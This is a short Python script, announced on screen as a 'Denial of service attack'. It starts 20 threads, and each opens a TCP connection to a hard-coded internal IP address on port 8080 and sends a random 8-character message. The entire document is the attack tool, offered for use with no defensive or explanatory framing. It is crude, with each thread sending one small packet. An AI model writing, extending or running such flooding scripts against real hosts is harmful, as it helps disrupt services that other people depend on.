import time
import socket
import sys
import threading

def create_rnd_msg(msg_size):
	import random

	rnd_msg = ""
	for i in range(0, msg_size):
		ch_rnd = random.choice(r"1234567890!@#$%^&*()~_+-=[]{}\';/.'|<,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
		rnd_msg += ch_rnd
	rnd_msg+="ds"
	return rnd_msg

print("\033[92mDenial of service attack..\033[00m\n")
time.sleep(3)
ip = "10.16.160.54"
thread_count = 20 #int(input("Enter the counts of threads: "))

port = 8080
print("Target ip: ", ip)
print("Target port: ", port)
time.sleep(3)
print("\n")

def dos():
    message = create_rnd_msg(8).encode('ascii')
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    client.send(message)
    print(f'Packet Sent Successfuly => Message: \033[94m {message.decode()} "\033[00m')

for i in range(thread_count):
	try:
		threading.Thread(target=dos).start()

	except KeyboardInterrupt:
		sys.exit(0)